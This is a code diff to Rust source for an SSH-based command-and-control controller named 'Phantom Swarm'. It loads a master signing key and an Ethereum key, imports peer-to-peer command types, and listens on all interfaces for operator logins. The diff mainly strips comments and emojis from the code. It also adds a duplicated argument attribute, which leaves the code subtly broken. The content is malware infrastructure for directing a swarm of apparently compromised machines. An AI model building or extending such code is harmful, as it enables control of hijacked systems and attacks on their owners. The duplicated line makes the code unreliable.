@@ -18,11 +18,10 @@ use protocol::p2p::{P2PCommand, P2P_MAGIC, P2P_TYPE_CMD};
 #[command(version = "2.0")]
 #[command(about = "SSH-based C2 Controller for Phantom Swarm", long_about = None)]
 struct Cli {
-    /// Path to Keys Directory (contains phantom_c2.key, phantom_eth.key, etc.)
     #[arg(long, default_value = "keys")]
     key: PathBuf,
 
-    /// Bind Port for SSH
+    #[arg(long, default_value_t = 12961)]
     #[arg(long, default_value_t = 12961)]
     port: u16,
 }
@@ -57,15 +56,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     env_logger::init();
     let cli = Cli::parse();
     
-    // 1. Load Master Signing Key (Ed25519) from keys directory
     let c2_key_path = cli.key.join("phantom_c2.key");
     let master_key = load_master_key(&c2_key_path);
-    info!("✅ Master Key Loaded from {:?}. ID: {}", c2_key_path, hex::encode(master_key.verifying_key().to_bytes()));
+    info!("Master Key Loaded from {:?}", c2_key_path);
     
-    // Store keys directory for later use (ETH key, etc.)
     let keys_dir = cli.key.clone();
 
-    // 2. Setup SSH Server Config
     let config = russh::server::Config {
         inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
         auth_rejection_time: std::time::Duration::from_secs(1),
@@ -89,9 +85,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // 4. Bind and Listen
     let addr = format!("0.0.0.0:{}", cli.port);
-    info!("🚀 Phantom C2 SSH Service Starting on {}", addr);
+    info!("Phantom C2 SSH Service Starting on {}", addr);
     // User requested log display in this terminal
-    info!("👉 Connect via: ssh admin@<IP> -p {}", cli.port);
+    info!("Connect via: ssh admin@<IP> -p {}", cli.port);
     
     let mut listener = TcpListener::bind(&addr).await.expect("Bind failed");
     
